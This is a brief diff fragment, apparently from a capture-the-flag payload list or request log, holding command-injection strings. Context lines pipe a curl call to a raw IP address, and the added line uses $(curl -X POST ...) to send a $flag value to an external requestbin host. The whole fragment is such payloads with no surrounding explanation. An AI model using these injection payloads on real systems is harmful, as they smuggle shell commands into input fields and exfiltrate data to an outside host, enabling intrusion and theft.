@@ -524,3 +524,4 @@ R1gelX29:|test
 R1gelX29:|test
 |curl http://101.132.238.43:5992/?xxx=xx;
 |curl http://101.132.238.43:5992/?xxx=xx;
+AFKL-CUIT:$(curl -X POST -d "fizz=$flag" http://requestbin.net/r/f3ixi7j0;)
